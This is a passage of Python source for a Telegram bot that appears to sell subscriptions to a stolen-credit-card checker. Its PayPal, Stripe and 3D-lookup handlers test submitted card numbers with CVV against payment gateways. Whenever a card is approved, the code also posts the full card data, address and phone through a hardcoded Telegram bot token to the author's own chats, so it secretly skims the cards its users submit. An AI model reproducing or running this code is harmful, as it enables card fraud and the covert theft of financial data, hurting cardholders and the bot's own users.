	if "Funds" in last or 'Insufficient Funds' in last or 'avs' in last or '1000: Approved' in last or 'Duplicate' in last or 'Approved' in last:
		tok = '7256336819:AAGOA4MBllwqF0XrP44Nfl1lS8xQK9Vb8GY'
		acc =  '-1002111411217'
		mg = f"""<b> 
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
❆═══» 𝙸𝙽𝙵𝙾 «═══❆
｢𝙱𝙸𝙽」➔ <code>{cc[:6]}</code>
｢𝙸𝙽𝙵𝙾」➔ <code>{brand} - {card_type} - {level}</code>
｢𝙱𝙰𝙽𝙺」➔ <code>{bank}</code>
｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @JI_NS
✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @Moha_Azouz  
</b>"""
		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
		tlg_params = {"parse_mode": "HTML"}
		tok = '7256336819:AAGOA4MBllwqF0XrP44Nfl1lS8xQK9Vb8GY'
		acb =  '-1002046977369'
		mag = f"""<b>
{cc}|{street}|{city}|{postal}|{phone}|UNITED STATES
</b>"""
		tly = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acb}&text={mag}"
		tlg_params = {"parse_mode": "HTML"}
		a = requests.post(tly, params=tlg_params)
		i = requests.post(tlg, params=tlg_params)
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
	else:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgd)
#paypal
@bot.message_handler(func=lambda message: message.text.lower().startswith('.pp') or message.text.lower().startswith('/pp'))
def respond_to_vbv(message):
	gate='𝐏𝐚𝐲𝐩𝐚𝐥 $𝟏'
	name = message.from_user.first_name
	idt=message.from_user.id
	id=message.chat.id
	with open('data.json', 'r') as json_file:
		json_data = json.load(json_file)

	try:BL=(json_data[str(idt)]['plan'])
	except:
		with open('data.json', 'r') as json_file:
			existing_data = json.load(json_file)
		new_data = {
			id : {
  "plan": "𝗙𝗥𝗘𝗘",
  "timer": "none",
			}
		}
		existing_data.update(new_data)
		with open('data.json', 'w') as json_file:
			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
		BL='𝗙𝗥𝗘𝗘'
	if BL == '𝗙𝗥𝗘𝗘':
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Moha_Azouz")
		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/PHP_BL")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝑯𝑬𝑳𝑳𝑶 {name}
			
¶ Subscription plan prices ⬇️
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
• 1- days ~> 2,5$. ✓
• 3- days ~> 5$. ✓
• 7- days ~> 9$. ✓
• 14- days ~> 14$. ✓
• 1- month ~> 24$. ✓
• 2- month ~> 40$. ✓ 
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
All payment methods are available. 💸
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

𝑪𝑳𝑰𝑪𝑲 /cmds 𝑻𝑶 𝑽𝑰𝑬𝑾 𝑻𝑯𝑬 𝑪𝑶𝑴𝑴𝑨𝑵𝑫𝑺

𝒀𝑶𝑼𝑹 𝑷𝑳𝑨𝑵 𝑵𝑶𝑾 {BL}</b>
''',reply_markup=keyboard)
		return
	with open('data.json', 'r') as file:
		json_data = json.load(file)
		date_str=json_data[str(id)]['timer'].split('.')[0]
	try:
		provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
	except Exception as e:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Moha_Azouz")
		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/PHP_BL")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝑯𝑬𝑳𝑳𝑶 {name}
			
¶ Subscription plan prices ⬇️
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
• 1- days ~> 2,5$. ✓
• 3- days ~> 5$. ✓
• 7- days ~> 9$. ✓
• 14- days ~> 14$. ✓
• 1- month ~> 24$. ✓
• 2- month ~> 40$. ✓ 
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
All payment methods are available. 💸
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

𝑪𝑳𝑰𝑪𝑲 /cmds 𝑻𝑶 𝑽𝑰𝑬𝑾 𝑻𝑯𝑬 𝑪𝑶𝑴𝑴𝑨𝑵𝑫𝑺

𝒀𝑶𝑼𝑹 𝑷𝑳𝑨𝑵 𝑵𝑶𝑾 {BL}</b>
''',reply_markup=keyboard)
		return
	current_time = datetime.now()
	required_duration = timedelta(hours=0)
	if current_time - provided_time > required_duration:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Moha_Azouz")
		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/PHP_BL")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗬𝗢𝗨 𝗖𝗔𝗡𝗡𝗢𝗧 𝗨𝗦𝗘 𝗧𝗛𝗘 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗕𝗘𝗖𝗔𝗨𝗦𝗘 𝗬𝗢𝗨𝗥 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 𝗛𝗔𝗦 𝗘𝗫𝗣𝗜𝗥𝗘𝗗</b>
	''',reply_markup=keyboard)
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		json_data[str(id)]['timer'] = 'none'
		json_data[str(id)]['paln'] = '𝗙𝗥𝗘𝗘'
		with open('data.json', 'w') as file:
			json.dump(json_data, file, indent=2)
		return
	try:command_usage[idt]['last_time']
	except:command_usage[idt] = {
				'last_time': datetime.now()
			}
	if command_usage[idt]['last_time'] is not None:
		time_diff = (current_time - command_usage[idt]['last_time']).seconds
		if time_diff < 30:
			bot.reply_to(message, f"<b>Try again after {30-time_diff} seconds.</b>",parse_mode="HTML")
			return	
	ko = (bot.reply_to(message, "𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗬𝗢𝗨𝗥 𝗖𝗔𝗥𝗗𝗦...⌛").message_id)
	try:
		cc = message.reply_to_message.text
	except:
		cc=message.text
	cc=str(reg(cc))
	if cc == 'None':
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
		return
	start_time = time.time()
	try:
		command_usage[idt]['last_time'] = datetime.now()
		last = str(pay(cc))
	except Exception as e:
		last='Error'
	try: data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
	except: pass
	try:
		level = data['level']
	except:
	    level = 'Unknown'
	try:
		brand = data['brand']
	except:
		brand = 'Unknown'
	try:
		card_type = data['type']
	except:
		card_type = 'Unknown'
	try:
		country = data['country_name']
		country_flag = data['country_flag']
	except:
		country = 'Unknown'
		country_flag = 'Unknown'
	try:
		bank = data['bank']
	except:
		bank = 'Unknown'
	end_time = time.time()
	execution_time = end_time - start_time
	msg=f'''<b>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 ✅
			
⸙ 𝘾𝙖𝙧𝙙 ➼ <code>{cc}</code>
⸙ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➼ {last}
⸙ 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➼ {gate}		
⸙ 𝘽𝙞𝙣 𝙄𝙣𝙛𝙤 ➼ {cc[:6]} - {card_type} - {brand}- {level}
⸙ 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➼ {country} - {country_flag} 
⸙ 𝙄𝙨𝙨𝙪𝙚𝙧 ➼ <code>{bank}</code>
⸙ 𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
⸙ 𝗕𝗼𝘁 𝗕𝘆: @Moha_Azouz </b>'''
	msgd=f'''<b>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 ❌
			
⸙ 𝘾𝙖𝙧𝙙 ➼ <code>{cc}</code>
⸙ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➼ {last}
⸙ 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➼ {gate}		
⸙ 𝘽𝙞𝙣 𝙄𝙣𝙛𝙤 ➼ {cc[:6]} - {card_type} - {brand}- {level}
⸙ 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➼ {country} - {country_flag} 
⸙ 𝙄𝙨𝙨𝙪𝙚𝙧 ➼ <code>{bank}</code>
⸙ 𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
⸙ 𝗕𝗼𝘁 𝗕𝘆: @Moha_Azouz</b>'''
	if "Funds" in last or 'Insufficient Funds' in last or 'avs' in last or '1000: Approved' in last or 'Duplicate' in last or 'Approved' in last:
		tok = '7256336819:AAGOA4MBllwqF0XrP44Nfl1lS8xQK9Vb8GY'
		acc =  '-1002111411217'
		mg = f"""<b> 
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
❆═══» 𝙸𝙽𝙵𝙾 «═══❆
｢𝙱𝙸𝙽」➔ <code>{cc[:6]}</code>
｢𝙸𝙽𝙵𝙾」➔ <code>{brand} - {card_type} - {level}</code>
｢𝙱𝙰𝙽𝙺」➔ <code>{bank}</code>
｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @JI_NS
✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @Moha_Azouz  
</b>"""
		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
		tlg_params = {"parse_mode": "HTML"}
		tok = '7256336819:AAGOA4MBllwqF0XrP44Nfl1lS8xQK9Vb8GY'
		acb =  '-1002046977369'
		mag = f"""<b>
{cc}|{street}|{city}|{postal}|{phone}|UNITED STATES
</b>"""
		tly = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acb}&text={mag}"
		tlg_params = {"parse_mode": "HTML"}
		a = requests.post(tly, params=tlg_params)
		i = requests.post(tlg, params=tlg_params)
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
	else:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgd)
####8
@bot.message_handler(func=lambda message: message.text.lower().startswith('.str') or message.text.lower().startswith('/str'))
def respond_to_vbv(message):
	id=message.from_user.id
	name = message.from_user.first_name
	gate='stripe charge'
	with open('data.json', 'r') as file:
		json_data = json.load(file)
	try:BL=(json_data[str(id)]['plan'])
	except:
		with open('data.json', 'r') as json_file:
			existing_data = json.load(json_file)
		new_data = {
			id : {
  "plan": "𝗙𝗥𝗘𝗘",
  "timer": "none",
			}
		}
		BL='𝗙𝗥𝗘𝗘'
		existing_data.update(new_data)
		with open('data.json', 'w') as json_file:
			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
	if BL == '𝗙𝗥𝗘𝗘':
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Moha_Azouz")
		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/PHP_BL")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝑯𝑬𝑳𝑳𝑶 {name}
			
¶ Subscription plan prices ⬇️
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
• 1- days ~> 2,5$. ✓
• 3- days ~> 5$. ✓
• 7- days ~> 9$. ✓
• 14- days ~> 14$. ✓
• 1- month ~> 24$. ✓
• 2- month ~> 40$. ✓ 
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
All payment methods are available. 💸
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

𝑪𝑳𝑰𝑪𝑲 /cmds 𝑻𝑶 𝑽𝑰𝑬𝑾 𝑻𝑯𝑬 𝑪𝑶𝑴𝑴𝑨𝑵𝑫𝑺

𝒀𝑶𝑼𝑹 𝑷𝑳𝑨𝑵 𝑵𝑶𝑾 {BL}</b>
''',reply_markup=keyboard)
		return
	with open('data.json', 'r') as file:
		json_data = json.load(file)
		date_str=json_data[str(id)]['timer'].split('.')[0]
	try:
		provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
	except Exception as e:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Moha_Azouz")
		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/PHP_BL")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝑯𝑬𝑳𝑳𝑶 {name}
			
¶ Subscription plan prices ⬇️
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
• 1- days ~> 2,5$. ✓
• 3- days ~> 5$. ✓
• 7- days ~> 9$. ✓
• 14- days ~> 14$. ✓
• 1- month ~> 24$. ✓
• 2- month ~> 40$. ✓ 
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
All payment methods are available. 💸
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

𝑪𝑳𝑰𝑪𝑲 /cmds 𝑻𝑶 𝑽𝑰𝑬𝑾 𝑻𝑯𝑬 𝑪𝑶𝑴𝑴𝑨𝑵𝑫𝑺

𝒀𝑶𝑼𝑹 𝑷𝑳𝑨𝑵 𝑵𝑶𝑾 {BL}</b>
''',reply_markup=keyboard)
		return
	current_time = datetime.now()
	required_duration = timedelta(hours=0)
	if current_time - provided_time > required_duration:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Moha_Azouz")
		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/PHP_BL")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗬𝗢𝗨 𝗖𝗔𝗡𝗡𝗢𝗧 𝗨𝗦𝗘 𝗧𝗛𝗘 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗕𝗘𝗖𝗔𝗨𝗦𝗘 𝗬𝗢𝗨𝗥 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 𝗛𝗔𝗦 𝗘𝗫𝗣𝗜𝗥𝗘𝗗</b>
	''',reply_markup=keyboard)
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		json_data[str(id)]['timer'] = 'none'
		json_data[str(id)]['paln'] = '𝗙𝗥𝗘𝗘'
		with open('data.json', 'w') as file:
			json.dump(json_data, file, indent=2)
		return
	ko = (bot.reply_to(message, "𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗬𝗢𝗨𝗥 𝗖𝗔𝗥𝗗𝗦...⌛").message_id)
	try:
		cc = message.reply_to_message.text
	except:
		cc=message.text
	cc=str(reg(cc))
	if cc == 'None':
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
		return
	start_time = time.time()
	last= str(st(cc))
	try: data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
	except: pass
	try:
	    level = data['level']
	except:
	    level = 'Unknown'
	try:
		brand = data['brand']
	except:
		brand = 'Unknown'
	try:
		card_type = data['type']
	except:
		card_type = 'Unknown'
	try:
		country = data['country']
		country_flag = data['country_flag']
	except:
		country = 'Unknown'
		country_flag = 'Unknown'
	try:
		bank = data['bank']
	except:
		bank = 'Unknown'
	end_time = time.time()
	execution_time = end_time - start_time
	print(last)
	hh = 'authenticate_successful'
	dd = '𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱 ❌'
	
	msg=f'''<b>𝗣𝗔𝗦𝗦𝗘𝗗  ✅ 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑪𝑨𝑹𝑫  ➜ <code>{cc}</code>
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ {gate}
◆ 𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 ➜ {hh}
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝑰𝑵 ➜ <code>{cc[:6]} - {card_type} - {brand}</code>
◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝒀: @Moha_Azouz
◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
	msgd=f'''<b>𝗥𝗘𝗝𝗘𝗖𝗧𝗘𝗗 ❌
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑪𝑨𝑹𝑫  ➜ <code>{cc}</code>
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ {gate}
◆ 𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 ➜ {dd}
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝑰𝑵 ➜ <code>{cc[:6]} - {card_type} - {brand}</code>
◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝒀: @Moha_Azouz
◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
	if 'Authenticate Attempt Successful' in last or 'Authenticate Successful' in last or 'authenticate_successful' in last:
		tok = '7256336819:AAGOA4MBllwqF0XrP44Nfl1lS8xQK9Vb8GY'
		acc =  '-1002111411217'
		mg = f"""<b> 
❆═══𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
❆═══𝙸𝙽𝙵𝙾═══❆
｢𝙱𝙸𝙽」➔ <code>{cc[:6]}</code>
｢𝙸𝙽𝙵𝙾」➔ <code>{brand} - {card_type} - {level}</code>
｢𝙱𝙰𝙽𝙺」➔ <code>{bank}</code>
｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ <code>{country} - {country_flag}</code>
❆═══𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁═══❆
✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @JI_NS
✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @Moha_Azouz
</b>"""
		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
		tlg_params = {"parse_mode": "HTML"}
		tok = '7256336819:AAGOA4MBllwqF0XrP44Nfl1lS8xQK9Vb8GY'
		acb =  '-1002046977369'
		mag = f"""<b>
{cc}|{street}|{city}|{postal}|{phone}|UNITED STATES
</b>"""
		tly = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acb}&text={mag}"
		tly_params = {"parse_mode": "HTML"}
		a = requests.post(tly, params=tly_params)
		i = requests.post(tlg, params=tlg_params)
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
	else:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgd)
@bot.message_handler(func=lambda message: message.text.lower().startswith('.redeem') or message.text.lower().startswith('/redeem'))
def respond_to_vbv(message):
	def my_function():
		global stop
		try:
			re=message.text.split(' ')[1]
			with open('data.json', 'r') as file:
				json_data = json.load(file)
			timer=(json_data[re]['time'])
			typ=(json_data[f"{re}"]["plan"])
			json_data[f"{message.from_user.id}"]['timer'] = timer
			json_data[f"{message.from_user.id}"]['plan'] = typ
			with open('data.json', 'w') as file:
				json.dump(json_data, file, indent=2)
			with open('data.json', 'r') as json_file:
				data = json.load(json_file)
			del data[re]
			with open('data.json', 'w') as json_file:
				json.dump(data, json_file, ensure_ascii=False, indent=4)
			msg=f'''<b>𝑴𝑬𝑫𝑶 ⌁ 𝗩𝗜𝗣 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗕𝗘𝗗 ✅
🙈 𝑺𝑼𝑩𝑺𝑪𝑹𝑰𝑷𝑻𝑰𝑶𝑵 𝗘𝗫𝗣𝗜𝗥𝗘𝗦 𝗜𝗡 ➜ {timer}
🧑🏻‍💻| BOT BY : @Moha_Azouz
𝗧𝗬𝗣 ➜ {typ}</b>'''
			bot.reply_to(message,msg,parse_mode="HTML")
		except Exception as e:
			print('ERROR : ',e)
			bot.reply_to(message,'<b>Incorrect code or it has already been redeemed </b>',parse_mode="HTML")
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.message_handler(commands=["code"])
def start(message):
	def my_function():
		id=message.from_user.id
		if not id ==admin:
			return
		try:
			h=float(message.text.split(' ')[1])
			with open('data.json', 'r') as json_file:
				existing_data = json.load(json_file)
			characters = string.ascii_uppercase + string.digits
			pas ='MEDO-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))
			current_time = datetime.now()
			ig = current_time + timedelta(hours=h)
			plan='𝗩𝗜𝗣'
			parts = str(ig).split(':')
			ig = ':'.join(parts[:2])
			with open('data.json', 'r') as json_file:
				existing_data = json.load(json_file)
			new_data = {
				pas : {
	  "plan": plan,
	  "time": ig,
			}
			}
			existing_data.update(new_data)
			with open('data.json', 'w') as json_file:
				json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
			msg=f'''<b>𝗡𝗘𝗪 𝗞𝗘𝗬 𝗖𝗥𝗘𝗔𝗧𝗘𝗗 🚀
		
𝗣𝗟𝗔𝗡 ➜ {plan}
𝗘𝗫𝗣𝗜𝗥𝗘𝗦 𝗜𝗡 ➜ {ig}
𝗞𝗘𝗬 ➜ <code>{pas}</code>
		
𝗨𝗦𝗘 /redeem [𝗞𝗘𝗬]</b>'''
			bot.reply_to(message,msg,parse_mode="HTML")
		except Exception as e:
			print('ERROR : ',e)
			bot.reply_to(message,e,parse_mode="HTML")
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.message_handler(func=lambda message: message.text.lower().startswith('.vbv') or message.text.lower().startswith('/vbv'))
def respond_to_vbv(message):
	id=message.from_user.id
	name = message.from_user.first_name
	gate='3D Lookup'
	with open('data.json', 'r') as file:
		json_data = json.load(file)
	try:BL=(json_data[str(id)]['plan'])
	except:
		with open('data.json', 'r') as json_file:
			existing_data = json.load(json_file)
		new_data = {
			id : {
  "plan": "𝗙𝗥𝗘𝗘",
  "timer": "none",
			}
		}
		BL='𝗙𝗥𝗘𝗘'
		existing_data.update(new_data)
		with open('data.json', 'w') as json_file:
			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
	if BL == '𝗙𝗥𝗘𝗘':
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Moha_Azouz")
		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/PHP_BL")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝑯𝑬𝑳𝑳𝑶 {name}
			
¶ Subscription plan prices ⬇️
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
• 1- days ~> 2,5$. ✓
• 3- days ~> 5$. ✓
• 7- days ~> 9$. ✓
• 14- days ~> 14$. ✓
• 1- month ~> 24$. ✓
• 2- month ~> 40$. ✓ 
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
All payment methods are available. 💸
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

𝑪𝑳𝑰𝑪𝑲 /cmds 𝑻𝑶 𝑽𝑰𝑬𝑾 𝑻𝑯𝑬 𝑪𝑶𝑴𝑴𝑨𝑵𝑫𝑺

𝒀𝑶𝑼𝑹 𝑷𝑳𝑨𝑵 𝑵𝑶𝑾 {BL}</b>
''',reply_markup=keyboard)
		return
	with open('data.json', 'r') as file:
		json_data = json.load(file)
		date_str=json_data[str(id)]['timer'].split('.')[0]
	try:
		provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
	except Exception as e:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Moha_Azouz")
		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/PHP_BL")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝑯𝑬𝑳𝑳𝑶 {name}
			
¶ Subscription plan prices ⬇️
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
• 1- days ~> 2,5$. ✓
• 3- days ~> 5$. ✓
• 7- days ~> 9$. ✓
• 14- days ~> 14$. ✓
• 1- month ~> 24$. ✓
• 2- month ~> 40$. ✓ 
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
All payment methods are available. 💸
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

𝑪𝑳𝑰𝑪𝑲 /cmds 𝑻𝑶 𝑽𝑰𝑬𝑾 𝑻𝑯𝑬 𝑪𝑶𝑴𝑴𝑨𝑵𝑫𝑺

𝒀𝑶𝑼𝑹 𝑷𝑳𝑨𝑵 𝑵𝑶𝑾 {BL}</b>
''',reply_markup=keyboard)
		return
	current_time = datetime.now()
	required_duration = timedelta(hours=0)
	if current_time - provided_time > required_duration:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Moha_Azouz")
		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/PHP_BL")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗬𝗢𝗨 𝗖𝗔𝗡𝗡𝗢𝗧 𝗨𝗦𝗘 𝗧𝗛𝗘 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗕𝗘𝗖𝗔𝗨𝗦𝗘 𝗬𝗢𝗨𝗥 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 𝗛𝗔𝗦 𝗘𝗫𝗣𝗜𝗥𝗘𝗗</b>
	''',reply_markup=keyboard)
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		json_data[str(id)]['timer'] = 'none'
		json_data[str(id)]['paln'] = '𝗙𝗥𝗘𝗘'
		with open('data.json', 'w') as file:
			json.dump(json_data, file, indent=2)
		return
	ko = (bot.reply_to(message, "𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗬𝗢𝗨𝗥 𝗖𝗔𝗥𝗗𝗦...⌛").message_id)
	try:
		cc = message.reply_to_message.text
	except:
		cc=message.text
	cc=str(reg(cc))
	if cc == 'None':
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:
